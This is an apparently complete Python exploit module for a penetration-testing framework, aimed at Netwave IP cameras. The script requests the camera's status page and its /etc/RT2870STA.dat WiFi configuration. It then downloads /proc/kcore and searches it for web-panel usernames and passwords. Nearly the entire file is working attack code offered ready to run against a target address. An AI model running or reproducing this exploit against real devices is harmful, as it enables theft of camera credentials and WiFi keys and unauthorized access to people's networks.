#!/usr/bin/env python

import urllib2
import re
import string
from collections import OrderedDict
from Sploit import Sploit

INFO = {}
INFO['NAME'] = "efa_netwave_ip_camera_information_disclosure"
INFO['DESCRIPTION'] = "Netwave IP Camera Information Disclosure"
INFO['VENDOR'] = ""
INFO["CVE Name"] = ""
INFO["NOTES"] = """Attacker can extract camera's WIFI settings and web-panel credentials."""
INFO["DOWNLOAD_LINK"] = ""
INFO["LINKS"] = ["http://0day.today/exploit/26889"]
INFO['CHANGELOG']="16 Jun, 2017"
INFO['PATH'] = "General/"

# Must be in every module, to be set by framework
OPTIONS = OrderedDict()
OPTIONS["HOST"] = "192.168.0.1"
OPTIONS["PORT"] = 80


class exploit(Sploit):
    def __init__(self,host="",
                port=0, ssl=False,
                logger=None):
        Sploit.__init__(self, logger=logger)

    def args(self):
        self.args = Sploit.args(self, OPTIONS)
        self.host = self.args.get("HOST", OPTIONS["HOST"])
        self.port = self.args.get("PORT", OPTIONS["PORT"])

    def make_url(self, path=''):
        url = 'http://{}:{}/{}'.format(self.host, self.port, path)
        return url

    def make_table(self, data):
        table = "\r\n" + "-" * 78 + "\r\n"
        table += "|" + "Privilege:".center(10, " ") + "|" + "Username:".center(32, " ") + "|" + "Password:".center(32, " ") + "|\r\n"
        table += "-" * 78 + "\r\n"
        for entry in data:
            table += "|" + entry[0].center(10, " ") + "|" + entry[1].center(32, " ") + "|" + entry[2].center(32, " ") + "|\r\n"
        table += "-" * 78 + "\r\n"
        return table

    def run(self):
        #Get options from gui
        self.args()
        self.log("[*] Trying to connect to {}".format(self.make_url()))
        urllib2.urlopen(self.make_url())
        self.log("[*] Getting common info")
        res = '\r\n' + urllib2.urlopen(self.make_url('get_status.cgi')).read()
        m = re.search('var alias=\'(.*?)\';', res)
        alias = m.group(1)
        if not alias:
            m = re.search('var id=\'(.*?)\';', res)
            alias = m.group(1)
        self.log('[+] \r\n###############STATUS###############' + res + '######################################')
        self.log('[*] Getting WIFI settings')
        try:
            res = '\r\n' + urllib2.urlopen(self.make_url('/etc/RT2870STA.dat')).read()
            self.log('[+] \r\n###############WIFI################' + res + '######################################')
        except:
            res = ''
            self.log('[-] Can\'t get WIFI settings')

        self.log('[*] Trying to find web-panel credentials. It\'s may take several minutes.')
        regexp = '[%s]{%d,}' % (string.printable, 3)
        pattern = re.compile(regexp)
        try:
            res = urllib2.urlopen(self.make_url('/proc/kcore')).read()
            words = pattern.findall(res)
            self.log('[*] Possible login/password pairs:')
            for i, word in enumerate(words):
                if alias in word:
                    user = words[i+1] if i+1 < len(words) else ''
                    passwd = words[i+2] if i+2 < len(words) else ''
                    self.log('[+] {}    {}'.format(user, passwd))
        except:
            self.log('[-] Can\'t get proc/kcore file')
        self.finish(True)


if __name__ == '__main__':
    """
    By now we only have the tool
    mode for exploit..
    Later we would have
    standalone mode also.
    """
    print "Running exploit %s .. " % INFO['NAME']
    e = exploit("192.168.0.1",80)
    e.run()
